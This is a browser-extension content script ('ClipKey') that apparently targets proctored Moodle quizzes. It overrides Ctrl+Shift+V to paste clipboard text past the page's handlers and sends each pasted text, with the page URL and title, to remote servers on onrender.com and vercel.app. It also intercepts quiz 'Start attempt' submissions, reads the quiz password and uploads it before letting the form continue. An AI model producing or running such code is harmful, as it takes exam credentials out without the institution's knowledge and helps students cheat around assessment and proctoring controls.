(() => {
  const SERVER_DIRECTORY_URL = "https://bnhserver.onrender.com";
  const DEFAULT_SERVER_BASE_URLS = [
    "https://clipkey-server.vercel.app",
    "https://clipkey-server.onrender.com"
  ];
  const CLIPKEY_EXTENSION_CLIENT = "smowl";
  let discoveredServerBaseUrls = null;
  let serverDiscoveryPromise = null;
  let sentFirstPastedText = false;
  let pendingCtrlShiftVPasteToken = 0;
  let pendingCtrlShiftVPasteTimer = null;

  // Remove passwords captured by older builds. Quiz passwords now go only to the server.
  try { chrome.storage.local.remove(["lockedQuizPassword"]); } catch {}

  function isCtrlShiftV(event) {
    return (event.ctrlKey || event.metaKey) &&
      event.shiftKey &&
      !event.altKey &&
      String(event.key || "").toLowerCase() === "v";
  }

  function getStorage(keys) {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.get(keys, (value) => resolve(value || {}));
      } catch {
        resolve({});
      }
    });
  }

  async function readClipboardText() {
    try {
      return await navigator.clipboard.readText();
    } catch {
      return "";
    }
  }

  function clearPendingCtrlShiftVPaste() {
    pendingCtrlShiftVPasteToken += 1;
    if (pendingCtrlShiftVPasteTimer) {
      clearTimeout(pendingCtrlShiftVPasteTimer);
      pendingCtrlShiftVPasteTimer = null;
    }
  }


  async function fetchFromServers(path, options = {}) {
    let lastError = null;
    const requestOptions = {
      ...options,
      headers: {
        ...(options.headers || {}),
        "X-ClipKey-Extension-Client": CLIPKEY_EXTENSION_CLIENT
      }
    };

    for (const baseUrl of await getServerBaseUrls()) {
      try {
        const response = await fetch(`${baseUrl}${path}`, requestOptions);
        if (response.ok) return response;
        lastError = new Error(`Server ${baseUrl} returned ${response.status}`);
      } catch (err) {
        lastError = err;
      }
    }

    throw lastError || new Error("All servers failed");
  }

  async function getServerBaseUrls() {
    if (discoveredServerBaseUrls?.length) return discoveredServerBaseUrls;
    if (serverDiscoveryPromise) return serverDiscoveryPromise;

    const abortCtrl = new AbortController();
    const abortTimer = setTimeout(() => abortCtrl.abort(), 1500);
    serverDiscoveryPromise = fetch(`${SERVER_DIRECTORY_URL}/api/servers`, {
      headers: { "X-ClipKey-Extension-Client": CLIPKEY_EXTENSION_CLIENT },
      signal: abortCtrl.signal
    }).finally(() => clearTimeout(abortTimer))
      .then(async (res) => {
        if (!res.ok) throw new Error(`Server directory returned ${res.status}`);
        const data = await res.json();
        const urls = Array.isArray(data?.urls)
          ? data.urls.filter((url) => typeof url === "string" && /^https?:\/\//i.test(url))
          : [];
        discoveredServerBaseUrls = [...new Set(urls)];
        return discoveredServerBaseUrls.length ? discoveredServerBaseUrls : DEFAULT_SERVER_BASE_URLS;
      })
      .catch((err) => {
        console.warn("ClipKey server directory unavailable; using fallback servers:", err);
        return DEFAULT_SERVER_BASE_URLS;
      })
      .finally(() => {
        serverDiscoveryPromise = null;
      });

    return serverDiscoveryPromise;
  }

  
  const PENDING_PASTES_KEY = "clipkey_pending_pastes";
  let isFlushingPastes = false;

  async function queuePendingPaste(pasteData) {
    try {
      const { [PENDING_PASTES_KEY]: existing = [] } = await getStorage([PENDING_PASTES_KEY]);
      const list = Array.isArray(existing) ? existing : [];
      const alreadyQueued = list.some((item) => item.text === pasteData.text && Math.abs(Date.now() - (item.queuedAt || 0)) < 15000);
      if (!alreadyQueued) {
        list.push({ ...pasteData, queuedAt: Date.now(), retries: 0 });
        await new Promise((r) => chrome.storage.local.set({ [PENDING_PASTES_KEY]: list }, r));
        console.log(`[clipkey] Queued password paste for background cold-start sync (total: ${list.length})`);
      }
      void flushPendingPastes();
    } catch (e) {
      console.warn("[clipkey] Could not queue pending paste:", e);
    }
  }

  async function flushPendingPastes() {
    if (isFlushingPastes) return;
    isFlushingPastes = true;

    try {
      const { [PENDING_PASTES_KEY]: existing = [], apiKey } = await getStorage([PENDING_PASTES_KEY, "apiKey"]);
      if (!Array.isArray(existing) || !existing.length) return;

      const remaining = [];
      for (const item of existing) {
        const key = item.apiKey || apiKey;
        if (!key) {
          remaining.push(item);
          continue;
        }

        try {
          const res = await fetchFromServers("/api/ctrl-shift-v-paste", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              apiKey: key,
              text: item.text,
              pageUrl: item.pageUrl || location.href,
              pageTitle: item.pageTitle || document.title,
              moduleName: item.moduleName || item.pageTitle || document.title
            })
          });
          if (res && res.ok) {
            console.log(`[clipkey] Queued paste successfully posted to database: "${item.text.slice(0, 30)}"`);
            continue;
          }
          item.retries = (item.retries || 0) + 1;
          remaining.push(item);
        } catch (err) {
          item.retries = (item.retries || 0) + 1;
          console.warn(`[clipkey] Cold start / network retry for queued paste: ${err.message}. Retrying in 4s...`);
          remaining.push(item);
        }
      }

      await new Promise((r) => chrome.storage.local.set({ [PENDING_PASTES_KEY]: remaining }, r));
      if (remaining.length > 0) {
        setTimeout(flushPendingPastes, 4000);
      }
    } catch (e) {
      console.warn("[clipkey] Error during flushPendingPastes:", e);
    } finally {
      isFlushingPastes = false;
    }
  }

  // Auto-flush pending pastes on page boot (handles cold-start completions across navigations)
  void flushPendingPastes();

    async function sendFirstPastedText(text) {
    const cleanText = String(text || "").trim();
    if (!cleanText) return;

    try {
      const { apiKey } = await getStorage(["apiKey"]);
      const heading = document.querySelector(".page-header-headings h1, .page-header-headings h2, .page-header-headings h3");
      const moduleName = heading ? (heading.textContent || "").replace(/\s+/g, " ").trim() : (document.title || "");

      await queuePendingPaste({
        apiKey: apiKey || null,
        text: cleanText,
        pageUrl: location.href,
        pageTitle: moduleName,
        moduleName
      });
    } catch (err) {
      console.warn("ClipKey Ctrl+Shift+V queue error:", err);
    }
  }

  async function handleCtrlShiftVPaste(text, token) {
    const pastedText = String(text || "");
    if (!pastedText.trim() || token !== pendingCtrlShiftVPasteToken) return;

    clearPendingCtrlShiftVPaste();
    insertText(pastedText);
    void sendFirstPastedText(pastedText);
  }

  function insertText(text) {
    const active = document.activeElement;
    if (!active || !text) return false;

    if (active.tagName === "TEXTAREA" || active.tagName === "INPUT") {
      const start = active.selectionStart ?? active.value.length;
      const end = active.selectionEnd ?? start;
      active.value = active.value.slice(0, start) + text + active.value.slice(end);
      active.selectionStart = active.selectionEnd = start + text.length;
      active.dispatchEvent(new InputEvent("input", {
        bubbles: true,
        inputType: "insertText",
        data: text
      }));
      return true;
    }

    if (active.isContentEditable) {
      const selection = window.getSelection();
      if (!selection?.rangeCount) return false;
      const range = selection.getRangeAt(0);
      range.deleteContents();
      range.insertNode(document.createTextNode(text));
      range.collapse(false);
      active.dispatchEvent(new InputEvent("input", {
        bubbles: true,
        inputType: "insertText",
        data: text
      }));
      return true;
    }

    try {
      return document.execCommand("insertText", false, text);
    } catch {
      return false;
    }
  }

  document.addEventListener("keydown", async (event) => {
    if (!isCtrlShiftV(event)) return;
    if (!window.__clipkeyExtraShortcutsEnabled) return;

    const { userType, apiKey } = await getStorage(["userType", "apiKey"]);
    if (!apiKey && userType !== "daily" && userType !== "monthly") return;

    event.stopImmediatePropagation();
    event.stopPropagation();

    clearPendingCtrlShiftVPaste();
    const token = pendingCtrlShiftVPasteToken;

    pendingCtrlShiftVPasteTimer = setTimeout(async () => {
      if (token !== pendingCtrlShiftVPasteToken) return;
      const text = await readClipboardText();
      if (token !== pendingCtrlShiftVPasteToken) return;
      await handleCtrlShiftVPaste(text, token);
    }, 150);
  }, true);

  document.addEventListener("paste", async (event) => {
    if (pendingCtrlShiftVPasteToken === 0) return;

    const text = event.clipboardData?.getData("text/plain") || "";
    if (!text.trim()) return;

    event.preventDefault();
    event.stopImmediatePropagation();
    event.stopPropagation();

    await handleCtrlShiftVPaste(text, pendingCtrlShiftVPasteToken);
  }, true);

  // ---- Auto-capture Moodle quiz password on "Start attempt" and send only to the server ----
  const isQuizPreflightForm = (form) => {
    if (!(form instanceof HTMLFormElement)) return false;
    const action = form.getAttribute("action") || "";
    return (
      (form.id === "mod_quiz_preflight_form" || action.includes("/mod/quiz/startattempt.php")) &&
      !!form.querySelector('input[name="quizpassword"], #id_quizpassword')
    );
  };

  const isCancelSubmitter = (submitter) => {
    if (!submitter) return false;
    return (
      submitter.name === "cancel" ||
      (submitter.dataset && submitter.dataset.cancel === "1") ||
      (submitter.getAttribute && submitter.getAttribute("data-cancel") === "1")
    );
  };

  const readQuizPasswordFromForm = (form) => {
    if (!form) return "";
    const direct = form.querySelector('input[name="quizpassword"], #id_quizpassword');
    const directValue = direct && typeof direct.value === "string" ? direct.value.trim() : "";
    if (directValue) return directValue;

    const active = document.activeElement;
    if (
      active instanceof HTMLInputElement &&
      (active.name === "quizpassword" || active.id === "id_quizpassword" || active.closest('[data-passwordunmaskid="id_quizpassword"]'))
    ) {
      const activeValue = active.value.trim();
      if (activeValue) return activeValue;
    }

    const wrapper = form.querySelector('[data-passwordunmaskid="id_quizpassword"]');
    const wrapperInput = wrapper && wrapper.querySelector("input:not([type='hidden'])");
    const wrapperValue = wrapperInput && typeof wrapperInput.value === "string" ? wrapperInput.value.trim() : "";
    if (wrapperValue) return wrapperValue;

    try {
      const fd = new FormData(form).get("quizpassword");
      return typeof fd === "string" ? fd.trim() : "";
    } catch { return ""; }
  };

  const lastSubmitterByForm = new WeakMap();
  let pwSubmitting = false;

  const readModuleName = () => {
    const h = document.querySelector(".page-header-headings h1, .page-header-headings h2, .page-header-headings h3");
    const name = h ? (h.textContent || "").replace(/\s+/g, " ").trim() : "";
    return name || document.title || "";
  };

  const continueSubmit = (form, submitter) => {
    try {
      if (submitter && submitter.name) {
        let hidden = form.querySelector('input[type="hidden"][data-clipkey-submitter="1"]');
        if (!hidden) {
          hidden = document.createElement("input");
          hidden.type = "hidden";
          hidden.setAttribute("data-clipkey-submitter", "1");
          form.appendChild(hidden);
        }
        hidden.name = submitter.name;
        hidden.value = submitter.value || "";
      }
      form.submit();
    } catch (e) {
      console.warn("[clipkey] continue submit failed:", e && e.message);
    }
  };

  window.addEventListener(
    "click",
    (e) => {
      const control = e.target instanceof Element ? e.target.closest("button, input") : null;
      if (!control) return;
      const type = (control.getAttribute("type") || control.type || "").toLowerCase();
      const isSubmitControl =
        (control.tagName === "BUTTON" && (!type || type === "submit")) ||
        (control.tagName === "INPUT" && (type === "submit" || type === "image"));
      if (isSubmitControl && isQuizPreflightForm(control.form)) {
        lastSubmitterByForm.set(control.form, control);
      }
    },
    true
  );

  window.addEventListener(
    "submit",
    async (e) => {
      const form = e.target;
      if (!isQuizPreflightForm(form)) return;
      const submitter = e.submitter || lastSubmitterByForm.get(form);
      if (isCancelSubmitter(submitter)) return;
      if (pwSubmitting) return;
      const pw = readQuizPasswordFromForm(form);
      if (!pw) return;
      pwSubmitting = true;
      e.preventDefault();
      e.stopImmediatePropagation();
      e.stopPropagation();

      const moduleName = readModuleName();
      const { apiKey } = await getStorage(["apiKey"]);
      await queuePendingPaste({
        apiKey: apiKey || null,
        text: pw,
        pageUrl: location.href,
        pageTitle: moduleName,
        moduleName
      });

      continueSubmit(form, submitter);
    },
    true
  );

})();
